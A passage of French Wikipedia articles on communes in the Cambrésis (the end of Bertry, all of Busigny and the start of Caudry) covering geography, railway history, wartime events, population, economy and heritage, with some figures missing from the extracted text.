En 2018, la commune comptait pour , soit un taux de 51,33 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Manifestations culturelles et festivités.
Chaque année, fin juin début juillet, a lieu la fête communale sur la place Fiévet.
Sports et loisirs.
Il existe à Bertry une douzaine d'associations sportives dans des domaines variés tels que football, course, danse, badminton, chasse, pétanque, cerf-volant, VTT ou colombophilie.
Le club "Les Aéro ch'ti" de Bertry a obtenu en 2022 la troisième place au championnat de France de cerfs-volants après avoir été classé quatrième à celui de 2019.
L'amichorale de Bertry, créée en septembre 1973, est une chorale qui accueille plus de 50 chanteurs addultes.
Cultes.
Les Bertrésiens disposent d'un lieu de culte catholique, l'église Notre-Dame-de-la-Visitation, qui dépend de la paroisse Sainte-Anne-en Cambrésis dans le diocèse de Cambrai.
Le temple de l'Église réformée de France sert de salle culturelle, cependant, une fois par an en août, on y assure encore des cultes. Occasionnellement, on y célèbre aussi des enterrements et des mariages.
Économie.
Revenus de la population et fiscalité.
En 2010, le revenu fiscal médian par ménage était de , ce qui plaçait Bertry au rang parmi les de plus de en métropole.
Emploi.
Bertry se trouve dans le bassin d'emploi du Cambrésis. L'agence Pôle emploi pour la recherche d'emploi la plus proche est localisée à Caudry.
En 2008, la population de Bertry se répartissait ainsi : 69,3 % d'actifs, ce qui est inférieur au 71,6 % d'actifs de la moyenne nationale et 9,1 % de retraités, un chiffre supérieur au taux national de 8,5 %. Le taux de chômage était de 11,2 % contre 12,7 % en 1999.
Entreprises et commerces.
Au 31 décembre 2009, Bertry comptait 92 établissements.
Répartition des établissements par domaines d'activité au 31 décembre 2009
Parmi les entreprises installées à Bertry on compte Hyodall, « le couturier du funéraire » (articles funéraires), Euréponge (fabrication et transformation d'éponges), Dylco (textiles techniques, notamment pour l'automobile) ou Nicols (fabrication de produits d'entretien et de nettoyage).
Culture locale et patrimoine.
Le géant.
Un géant, nommé Tiot Achille, est né en 2007 à l'initiative de l'association « Dynamic Bertry » et de la municipalité. Il représente le dernier tisseur de la commune et commémore l'activité textile qui a structuré la vie du village pendant plusieurs décennies. Achille est un mulquinier monté sur roulettes de près de . Il est vêtu d'un bleu de travail et tient à la main une navette. Il a pour marraine, la brodeuse Pénélope de Villers-Outréaux et pour parrain le dentellier Batiste de Caudry.
Personnalités liées à la commune.
Le village appartient pendant cinq siècles aux maisons de Sohier, de Luxembourg, de Le Sart, et de Fariaux, et, en 1594, au roi Henri IV.

</doc>
<doc id="191695" url="https://fr.wikipedia.org/wiki?curid=191695" title="Busigny">
Busigny

Busigny est une commune française située dans le département du Nord (59), en région Hauts-de-France.
Ses habitants sont appelés les "Busignois". Le nom jeté des habitants de Busigny est les "Croquands" (ou "Croquants").
Limitrophe du département de l'Aisne, Busigny est située à l'extrémité sud-est de l'arrondissement de Cambrai auquel elle est rattachée. Longtemps possession du chapitre de l'église Saint-Géry de Cambrai, le village partageait son activité entre l'agriculture et le tissage, comme beaucoup d'autres dans cette région. Avec la construction, dans la deuxième moitié du , de la ligne de chemin de fer Saint-Quentin - Hautmont, section de la ligne Paris - Bruxelles, puis d'embranchements vers Cambrai et Hirson, la commune devint un nœud ferroviaire important du nord de la France. La ligne Paris - Bruxelles a perdu de son importance depuis l'ouverture de la LGV Nord, et l'industrie textile a disparu dans la deuxième moitié du . Busigny conserve cependant quelques activités industrielles.
Géographie.
Localisation.
La ville, située dans l'extrême sud du département du Nord, est frontalière du département de l'Aisne, région Hauts-de-France.
Busigny est à de Bohain-en-Vermandois, du Cateau-Cambrésis, de Caudry, de Cambrai, de Saint-Quentin, de Lille et enfin à de Paris à vol d'oiseau.
Géologie et relief.
Busigny est située dans la partie sud-est du Cambrésis, qui est la plus élevée, et son finage inclut le point culminant de cette région, à au lieu-dit le Rond-Point. Le village est entouré de bois sur ces hauteurs, à l'est et au sud. La Selle, affluent de rive droite de l'Escaut, prend sa source non loin, à Molain à à l'est. La source de l'Escaut lui-même est à Gouy, à environ à l'ouest.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le Riot de la Ville, le Calenne et un autre petit cours d'eau.
La ville est traversée par le « riot de la Ville », rigole creusée au pour drainer les eaux de ruissellement et qui rejoint à Maretz une branche du « canal des Torrents », une autre rigole de drainage, pour finir à la source de l'Escaut à Gouy, à l'ouest. L'entretien du « canal des Torrents » a été négligé dans la deuxième moitié du et sa branche principale, passant par Bohain-en-Vermandois et entre Brancourt-le-Grand et Prémont, a disparu des cartes de l'IGN, mais celle qui passe au nord par Maretz est encore visible.
Trois plans d'eau complètent le réseau hydrographique : le Flaquet (), les Faux Viviers () et les Viviers Malins ().
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Environnement.
Depuis le Moyen Âge, en raison de la richesse des sols, le Cambrésis a perdu la plupart de ses forêts pour évoluer vers un paysage de culture intensive. Dans le sillage du Grenelle Environnement et d'une politique régionale en faveur de la biodiversité, un schéma régional d'orientation Trame verte et bleue (qui évolue en SRCE en 2011-2013) a défini en 2006 les grandes connexions biologiques déclinées aux échelles locales par le Pays du Cambrésis via un Schéma trame verte et bleue territorial et un Programme régional d'animation et d'assistance technique territoriale (PRAATT). Celui-ci, avec la commune et l'Association foncière de remembrement (AFR) de la commune et d'autres partenaires (ENRx, agriculteurs, chasseurs, riverains...), a commencé à restaurer un réseau de haies bocagères (plus de en 2012) le long des chemins de remembrement et chemins communaux et de voiries départementales pour restaurer une trame écopaysagère et lutter contre l'érosion des sols, au profit également du cadre de vie de Busigny.
Voies de communication et transports.
Busigny est traversée par la route départementale D21 de Bohain au Cateau-Cambrésis, ainsi que par la route départementale D15 de Maretz à Vaux-Andigny et, au nord de la commune, par la D67 qui relie la route départementale D932 (dite « chaussée Brunehaut ») à la D77 vers Escaufourt et Vaux-Andigny.
La commune est desservie par une ligne du réseau CambrésiX, groupement composé de six entreprises de transport locales, vers Caudry et Le Cateau-Cambrésis.
Busigny était un nœud important du trafic ferroviaire du nord de la France. En effet, la gare (entre Busigny et Maretz) était le lieu où convergeaient les axes Paris - Maubeuge (et Bruxelles) et Paris - Cambrai. Elle reset desservie par les lignes (Busigny - Jeumont - Aulnoye-Aymeries, avec correspondances pour Valenciennes et Lille) et (Saint-Quentin - Cambrai - Lille) des TER Nord-Pas-de-Calais. Aussi, elle est un lieu de correspondance entre trains Intercités et TER. Le document d'orientations générales du SCot du Cambrésis retient la gare de Busigny comme l'un des cinq « pôles d'échanges structurants » de l'arrondissement.
Urbanisme.
Typologie.
Au , Busigny est catégorisée bourg rural, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Busigny, une agglomération intra-départementale regroupant deux communes, dont elle est ville-centre. La commune est en outre hors attraction des villes.
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (77,7 % en 2018), une proportion sensiblement équivalente à celle de 1990 (78,5 %). La répartition détaillée en 2018 est la suivante : 
terres arables (56,5 %), prairies (20,8 %), zones urbanisées (11,7 %), forêts (10,5 %), zones agricoles hétérogènes (0,4 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Morphologie urbaine.
Le bâti de la commune se divise en deux parties bien distinctes : le bourg proprement dit, et à l'ouest, à égale distance du bourg et du village de Maretz, la « cité des cheminots » construite entre 1919 et 1921 pour héberger le personnel du centre ferroviaire. Outre une soixantaine de logements, elle conserve une école s.
Très étendue, la ville se compose d'un hameau : La Haie Menneresse et de plusieurs lieux-dits : Malmaison, Mont-de-Bagny, Saint-Urbain, et le Rond-Point.
Logement.
En 2008, Busigny comptait , auxquelles s'ajoutaient vacants, soit 7,6 % du total, et un faible nombre de résidences secondaires. Les maisons représentaient 96,8 % de l'ensemble des logements, pourcentage identique au recensement de 1999 et nettement supérieur à celui observé dans le département du Nord (68,6 %).
La part de résidences principales datant d'avant 1949 s'élevait à 62,6 %. Pour les constructions plus récentes, 25,2 % des logements dataient d'entre 1949 et 1974 et 12,3 % d'après 1975.
Toponymie.
On trouve Busigny désignée sous les noms suivants au fil de l'histoire : Buising (1030), Busignies (1129), Busenisen (1180), Buseignies (1349), Buseghem (1442), Busenies, Busegnies, Busynges (1470).
"Bus" signifie en bas latin « bois, forêt ». Le suffixe "-igny" vient peut-être du germanique "ing", ou "ghem", qui ont le sens de lieu habité, hameau. "Ignieull" et "irigny" étaient la forme romane du mot. Busigny serait donc l'« habitation des bois », le « village des bois ». Busigny était jusqu'en 1640 couverte de bois et est encore bordée de bois à l'est et au sud.
Histoire.
Antiquité et Moyen Âge.
À l'époque gallo-romaine le lieu appartenait à la cité des Nerviens, dont la première capitale, Bavay, fut remplacée par Cambrai au . Des traces d'une occupation romaine ont été découvertes en 1847 et 1848 près de la ferme du Rond-Point, au sud-ouest du bourg. Il s'agit d'une enceinte entourée d'un fossé, au milieu de laquelle s'élève une butte. On y a découvert des dalles de grès, des tuiles, des médailles ou monnaies, un mors de bride et une statuette en bronze représentant une divinité païenne. Une voie empierrée, découverte en 1848, reliait ce lieu à la « chaussée Brunehaut » de Vermand à Bavay.
Un cimetière mérovingien a également été découvert dans les années 1970, il se trouvait sur la route menant de BUSIGNY à BERTRY après le pont SNCF où se trouvait une carrière de craie. Son mobilier est visible au musée des Beaux-Arts de Cambrai.
La redoute romaine fut remplacée par un château au . Repaire de brigands, il fut détruit en 1095 par l'évêque de Cambrai Gaucher.
En 878, le pape Jean VIII céda au chapitre de l'église Saint-Géry de Cambrai la possession des terres de Busigny, de sa ferme seigneuriale, de son église et de ses dépendances. Le pape Alexandre III confirma cet acte en 1180.
Avant la Révolution française, Busigny est le siège d'une seigneurie.
Gilles de Chin, seigneur de Busigny, meurt à la bataille d'Azincourt en 1415.
Le village se situait à l'origine à l'emplacement du hameau actuel de Malmaison. Après la destruction de l'église par un incendie au , la nouvelle église et les habitations furent reconstruites au nord-est, à leur emplacement actuel.
Époque moderne.
Busigny est la première commune du Cambrésis à avoir bénéficié du chemin de fer. La "station de Busigny" est mise en service le 21 octobre 1855 par la Compagnie des chemins de fer du Nord, lorsqu'elle ouvre la ligne de Saint-Quentin à Hautmont. Busigny devient une gare de bifurcation avec la mise en service le 15 juillet 1858 de la ligne de Busigny à Somain via Cambrai.
Pour décharger la ligne reliant les mines du Nord et du Pas-de-Calais à la sidérurgie lorraine, par Valenciennes et Longwy, la Compagnie des chemins de fer du Nord décida de construire une ligne reliant Busigny à Hirson. Cette ligne à double voie fut ouverte en 1885. Elle se détachait de la ligne Creil - Jeumont au sud de la gare de Busigny. Elle assura le transport des voyageurs jusqu'en 1959, et des marchandises jusqu'aux années 1980. L'électrification de la ligne Lille - Thionville, achevée en 1955, enleva en effet une grande partie de sa raison d'être à la ligne de Busigny à Hirson. La section Busigny - Boué n'a été déposée en partie qu'en 2006.
Pendant la guerre franco-allemande de 1870, la gare de Busigny permit aux hommes du de l'Armée du Nord du général Faidherbe, battu à Saint-Quentin le 19 janvier 1871, de faire retraite vers Cambrai et Lille.
Première Guerre mondiale.
Au cours de la Première Guerre mondiale, Busigny ne fut pas le théâtre de combats importants mais subit un bombardement par l'armée française, la ville étant occupée par les troupes allemandes après la bataille du Cateau en août 1914.
Busigny fut libéré le 9 octobre 1918 par la d'infanterie des États-Unis, qui y établit brièvement son état-major. Des hôpitaux de campagne furent installés dans les deux mois suivants.
Seconde Guerre mondiale.
La gare de Busigny étant un centre ferroviaire important entre Paris et Bruxelles et l'Allemagne, elle fut la cible de plusieurs bombardements, parfois très meurtriers, ainsi que d'actions de sabotage du maquis FTP "La CORSE".
Le premier bombardement, par la Luftwaffe, eut lieu le 15 mai 1940.
Le 30 avril 1944 vers 19 heures, 75 bombardiers du de bombardement de l'US Air Force bombardèrent en trois vagues toutes les installations ferroviaires. La gare devait être déserte à cette heure, mais le retard du train Dijon - Lille, et la présence en gare de trois omnibus attendant la correspondance, entraînèrent la mort d'environ civiles. Le 2 mai 1944 la gare fut à nouveau bombardée par l'.
Constitué à partir de juillet 1943, le maquis de Mazinghien, fort de et dont le terrain d'action s'étendait sur le sud du Nord et le nord de l'Aisne, mena des actions de renseignement et de sabotage, ainsi le 3 mars 1944 un sabotages sur la ligne Busigny - Hirson conduit au déraillement d'un train de charbon destiné à l'Allemagne ; le 4 juin 1944, un nouveau sabotage à Saint-Benin provoque le déraillement d'un convoi de chars Tigre. Après le débarquement allié en Normandie et jusqu'en 22 septembre 1944, date de la dissolution du maquis, d'autres actions de sabotage ont lieu dans la région.
Un autre réseau est particulièrement actif à Busigny et sur les installations ferroviaires, il s'agit d'un réseau FTP "La CORSE" auquel appartenaient Edmond et Lucien Desjardins
Plusieurs résistants payèrent leur engagement de leur vie, Pierre GALLIEGUE, Edmond et Lucien DESJARDIN du réseau FTP la CORSE sont arrêtés et transférés à la prison de SAINT QUENTIN où ils seront fusillés au lieu-dit la Sentinelle à SAINT QUENTIN le 08 avril 1944. quant à M Edmond DEGOND - Instituteur et capitaine de reserve de l'armée française, titulaire de la légion d'honneur - membre du réseau "Front National" il sera arrêté par la gestapo dans sa salle de classe. Il sera déporté à Neuwengam d'où il reviendra en 1945. Il sera maire de la commune de 1947 à 1953. Une plaque commémorative déposée par les habitants de Busigny à l'école primaire jacques Prévert rappelle son engagement. Franck Bourreau, âgé de , sera le plus jeune fusillé civil de France avec quatre de ses camrades. Le monument des cinq jeunes fusillés se trouve sur la route menant à BECQUIGNY au lieu-dit la Haïre
Le 29 janvier 1944 le bombardier B-17 nommé "Mary Ellen", de retour d'une mission sur Francforttouché par la défense antiaérienne allemande s'écrase à Busigny. Six des dix membres d'équipage purent sauter en parachute, quatre furent arrêtés, deux purent s'échapper avec l'aide de résistants et de familles françaises, dont le second lieutenant Richardson. Les quatre autres furent tués dans l'écrasement de l'appareil. Un mémorial fut érigé en mémoire des membres d'équipage morts sur la route de la HAIE MENERESSE. Une plaque offerte par le colonel Richardson ainsi qu'un morceau de l'avion sont fixés sur ce monument.
Situation contemporaine.
L'activité de Busigny se partageait après la guerre entre l'agriculture (blé, betteraves, houblon) et l'industrie textile (confection, bonneterie, lingerie, tissus). Depuis les années 1970, ces industries ont disparu. Quelques entreprises du bâtiment et de la construction métallique subsistent à Busigny malgré un contexte économique difficile.
Politique et administration.
Rattachements administratifs et électoraux.
La commune se trouve dans l'arrondissement de Cambrai du département du Nord. Pour l'élection des députés, elle fait partie depuis 1988 de la dix-huitième circonscription du Nord.
Elle faisait partie depuis 1801 du canton de Clary. Dans le cadre du redécoupage cantonal de 2014 en France, la commune est désormais rattachée au canton du Cateau-Cambrésis.
La ville de Busigny est dans le ressort de la cour d'appel de Douai, du tribunal de grande instance, du tribunal d'instance et du conseil de prud'hommes de Cambrai, et à la suite de la réforme de la carte judiciaire engagée en 2007, du tribunal de commerce de Douai.
Intercommunalité.
Busigny était membre de la communauté de communes du Caudrésis créée fin 1993.
Celle-ci fusionne avec la communauté de communes du Pays de Matisse pour créer le la Communauté d'agglomération du Caudrésis - Catésis, dont le bourg est désormais membre.
Tendances politiques et résultats.
Au deuxième tour des élections régionales de 2010, 47,35 % des suffrages exprimés sont allés à la liste conduite par Daniel Percheron (PS), 25,58 % à celle de Valérie Létard (UMP), et 27,07 % à la liste FN de Marine Le Pen, pour un taux de participation de 54,62 %.
Aux élections européennes de 2009, les deux meilleurs scores à Busigny étaient ceux de la liste de la majorité présidentielle conduite par Dominique Riquet, qui a obtenu soit 21,55 % des suffrages exprimés (département du Nord 24,57 %) et de la liste du Front national conduite par Marine Le Pen, qui a obtenu soit 19,25 % des suffrages exprimés (département du Nord %), pour un taux de participation de 41,18 %.
Au deuxième tour de l'élection présidentielle de 2007, 50,29 % des électeurs ont voté pour Nicolas Sarkozy (UMP), et 49,71 % pour Ségolène Royal (PS), avec un taux de participation de 83,94 %.
Au deuxième tour des élections législatives de 2007, 48,90 % des électeurs de Busigny ont voté pour François-Xavier Villain (UMP) (57,45 % dans la du Nord), 51,10 % pour Brigitte Douay (PS) (42,55 % dans la circonscription), avec un taux de participation de 59,33 % à Busigny et de 60,08 % dans la circonscription.
Administration municipale.
La commune ayant mois de en 2008, le nombre de conseillers municipaux est de 19. Depuis 2025, le maire est René Scailteux.
Liste des maires.
Maire de 1802 à 1808 : Jean Théodore Druon.
Maire en 1881 : Lepousez-Noiret.
Politique environnementale.
La protection et la mise en valeur de l'environnement font partie des compétences de la communauté d'agglomération du Caudrésis - Catésis.
Jumelages.
Au 12 janvier 2012, Busigny n'est jumelée avec aucune autre commune.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 38,6 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 24,9 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,06 % d'hommes, légèrement supérieur au taux départemental (48,23 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Enseignement.
Busigny est rattachée à la circonscription de Cambrai/Le Cateau de l'inspection académique du Nord dans l'académie de Lille.
La commune gère une école maternelle, l'école du Centre, ainsi que deux écoles primaires, Jacques-Prévert et Claude-Bernard, rattachées au secteur du collège Jean-Rostand du Cateau-Cambrésis. Les lycées les plus proches sont à Caudry et au Cateau-Cambrésis.
Santé.
En 2012 Busigny compte un médecin généraliste, trois infirmières et une pharmacie. L'hôpital le plus proche est celui du Cateau-Cambrésis.
Cultes.
Les Busignois disposent d'un lieu de culte catholique, l'église Saint-Médard, qui fait partie de la paroisse Sainte-Anne-en-Cambrésis dans le diocèse de Cambrai.
Économie.
Revenus de la population et fiscalité.
En 2009, le revenu fiscal médian par ménage était de , ce qui plaçait Busigny au rang parmi les communes de plus de 50 ménages en métropole.
Emploi.
Busigny se trouve dans le bassin d'emploi du Cambrésis. L'agence Pôle emploi pour la recherche d'emploi la plus proche est localisée au Cateau-Cambrésis.
En 2008, la population de Busigny se répartissait ainsi : 63,9 % d'actifs, ce qui est inférieur au 71,6 % d'actifs de la moyenne nationale et 11,3 % de retraités, un chiffre supérieur au taux national de 8,5 %. Le taux de chômage était de 11,7 % contre 11,3 % en 1999.
Entreprises et commerces.
Les industries textiles, autrefois importantes à Busigny, ont aujourd'hui disparu. Parmi les entreprises principales implantées dans la commune subsistent les constructions métalliques Brillard et Choin, une entreprise de captage et d'embouteillage d'eau de source du groupe Cristaline.
Au 31 décembre 2009, Busigny comptait .
Répartition des établissements par domaines d'activité au 31 décembre 2009
Culture locale et patrimoine.
Lieux et monuments.
Deux tours datant de la seconde moitié du sont le seul vestige de l'ancien château de Busigny, construit par le baron Jacques de Hannecart après la destruction du précédent château, édifié à la fin du , par un incendie vers 1755. De style Renaissance, il se composait d'une construction centrale flanquée de deux ailes terminées chacune par une tour carrée. En 1805 le château devint la propriété de l'épouse du général d'Empire Jean Rapp. Il fut démoli en 1972, à l'exception des tours.
L'église Saint-Médard fut édifiée au et achevée en 1542. Entre 1750 à 1752 on y ajouta des bas-côtés. La tour carrée qui domine le porche fut construite en 1831 sur les plans de l'architecte cambrésien André de Baralle. Le chœur actuel date du milieu du .
La chapelle Saint-Urbain fut édifiée dans les bois près d'une source dont l'eau était réputée pour ses vertus curatives. La légende raconte que des fleurs de laine y poussèrent après que des moutons eurent été engloutis par la source. La chapelle fut reconstruite au . On y allait en pèlerinage jusqu'à ce que la source soit murée pour cause d'insalubrité. Cependant une messe y est encore célébrée chaque année, fin mai.
La gare de Busigny est mise en service par la Compagnie des chemins de fer du Nord le 21 octobre 1855. En 1864, on lui ajoute une remise aux voitures, et, en 1865, le bâtiment voyageurs définitif remplace la construction provisoire.
Busigny Communal Cemetery Extension est un cimetière militaire britannique géré par la "Commonwealth War Graves Commission". La plupart des tombes sont celles de soldats dirigés vers les trois hôpitaux de campagne installés à Busigny en octobre et novembre 1918, après la reconquête du village par les Américains et les Britanniques. Après l'armistice des corps y furent amenés d'une dizaine de cimetières alentour. Le cimetière contient 670 tombes de soldats de la Première Guerre mondiale, dont 64 non identifiés.
Vie culturelle.
Plus de vingt associations participent à la vie de la commune dans le domaine des arts, des sports et de la vie civique.
L'association "Arts en Cambrésis", créée en 1997, se donne pour but l'organisation de manifestations culturelles (expositions, concerts, spectacles de théâtre, conférences), la mise d'un lieu de rencontres ou de travail, « l'Atelier », à la disposition d'artistes, la sensibilisation des jeunes à l'art et la constitution d'une collection d'art contemporain.
L'association des Familles de Busigny se montre particulièrement active pour tisser des liens entre les Busignois par des actions à vocation sociale et familiale et culturelles. L'association est bien connue au travers de son activité dans le domaine de la ferronnerie d'art.
L'association SOS Village d'enfants a inauguré le premier village d'enfants SOS en 1956 à l'initiative de Mr Gilbert Cotteau, fondateur de l'association.

</doc>
<doc id="191696" url="https://fr.wikipedia.org/wiki?curid=191696" title="Caudry">
Caudry

Caudry est une commune française située dans le sud du département du Nord en région Hauts-de-France. Elle est peuplée de au dernier recensement .
Caudry est longtemps resté un village que rien ne distinguait de ses voisins et qui n'occupe pas une position stratégique. Son activité, comme celle des autres villages du Cambrésis, se partageait entre l'agriculture et le tissage. Au début du , des tisserands se lancent dans la fabrication de tulle à l'aide de métiers importés en fraude d'Angleterre. Après des débuts difficiles, l'industrie textile métamorphose Caudry en quelques décennies de village en petite ville industrielle : fabrication du tulle, de la dentelle mécanique « Leavers », dont la qualité est couronnée à l'exposition internationale de Bruxelles de 1910, à quoi s'ajoute la broderie mécanique.
Bien que les effectifs de l'industrie textile aient beaucoup diminué au à Caudry comme dans le Cambrésis, la ville s'efforce, dans les dernières décennies du et le début du , de conserver sa vocation industrielle tout en la diversifiant. Elle partage avec Calais le titre de capitale mondiale de la « dentelle de Calais-Caudry », destinée à la haute-couture et au prêt-à-porter de luxe et a reçu en 1995 le label « Ville et Métiers d'Art ».
Géographie.
Localisation.
Caudry est située dans la région Hauts-de-France, dans le sud du département du Nord. À vol d'oiseau, la ville est à du Cateau-Cambrésis, de Cambrai, de Valenciennes et de Saint-Quentin. La capitale régionale, Lille, est à .
La commune est située approximativement au centre du Cambrésis, région historique et naturelle qui borde le Bassin parisien au nord, entre les collines de l'Artois à l'ouest et la Thiérache à l'est. Autour de Caudry s'étendent des paysages d'openfield parsemés d'un réseau dense de gros villages. Les terres labourables sont consacrées principalement aux céréales, aux cultures fourragères et à la betterave. Caudry est à une dizaine de kilomètres à l'ouest du parc naturel régional de l'Avesnois.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le torrent d'Esnes, le riot de Caudry et le riot des Quarante.
Le torrent d'Esnes, d'une longueur de , prend sa source dans la commune de Bertry et se jette dans la rivière Escaut à Crèvecœur-sur-l'Escaut, après avoir traversé .
Le riot de Caudry, d'une longueur de , s'écoule vers le nord-ouest. Il prend sa source dans la commune et se jette dans l'Erclin à Rieux-en-Cambrésis, après avoir traversé .
Les vallées de ces deux cours d'eau, en aval de Caudry, sont classées « espaces à renaturer ».
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Voies de communication et transports.
Réseau ferré.
La gare de Caudry est sur la ligne des TER Nord-Pas-de-Calais et TER Picardie (Lille - Douai - Cambrai - Saint-Quentin - Laon - Reims) et des trains intercités Cambrai - Paris. Elle est desservie par des trains directs à destination de Cambrai, Lille, Paris, Reims et Chauny.
Jusqu'en 1960, date de fermeture de la dernière ligne, Caudry était au centre du réseau local de la Société des chemins de fer du Cambrésis qui reliait la ville à Cambrai, Denain, Le Cateau et Catillon, et Saint-Quentin.
Réseau routier.
Caudry est située immédiatement au sud de la route départementale 643 (anciennement route nationale 39, puis route nationale 43) qui relie Cambrai à l'ouest à Charleville-Mézières à l'est. Les routes départementales D16, D16a, D45, D115 et D115a traversent également le territoire communal.
Un contournement routier de , qui doit relier par l'ouest de la ville la RD 643 au nord au pôle de la gare au sud en desservant la future piscine intercommunale et le centre de formation des apprentis, est inscrit depuis 2008 parmi les projets prioritaires du conseil général.
Transports en commun.
Caudry est desservie par huit lignes du réseau CambrésiX, groupement composé de six entreprises de transport locales, vers Cambrai, Le Cateau-Cambrésis, Villers-Outréaux, Avesnes-les-Aubert et Valenciennes.
Urbanisme.
Typologie.
Au , Caudry est catégorisée centre urbain intermédiaire, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Caudry, une agglomération intra-départementale regroupant quatre communes, dont elle est ville-centre. Par ailleurs la commune fait partie de l'aire d'attraction de Caudry, dont elle est la commune-centre. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (54,4 % en 2018), en diminution par rapport à 1990 (65 %). La répartition détaillée en 2018 est la suivante : 
terres arables (52,4 %), zones urbanisées (28,4 %), zones industrielles ou commerciales et réseaux de communication (13,6 %), espaces verts artificialisés, non agricoles (3,6 %), zones agricoles hétérogènes (2 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Morphologie urbaine.
Caudry s'est développée entre la route départementale 643, au nord, et la voie de chemin de fer Busigny - Somain, au sud.
La croissance industrielle et démographique, au , a résulté en une juxtaposition de logements et d'ateliers sans plan d'ensemble. Certains quartiers, comme le Transvaal, se créent autour d'une usine. Cependant la ville se dote d'équipements urbains dès la fin du siècle, avec un hôtel de ville, un abattoir, la reconstruction de l'église, la mise en place d'un service des eaux. Il fallut ensuite attendre la seconde moitié du pour que la ville se modernise à nouveau, avec la construction d'un stade nautique en 1951, d'une salle des fêtes en 1953, de lotissements individuels et collectifs, d'une zone industrielle au début des années 1970 et enfin dans les années 1990 d'une base de loisirs, d'un cinéma et d'un théâtre municipaux.
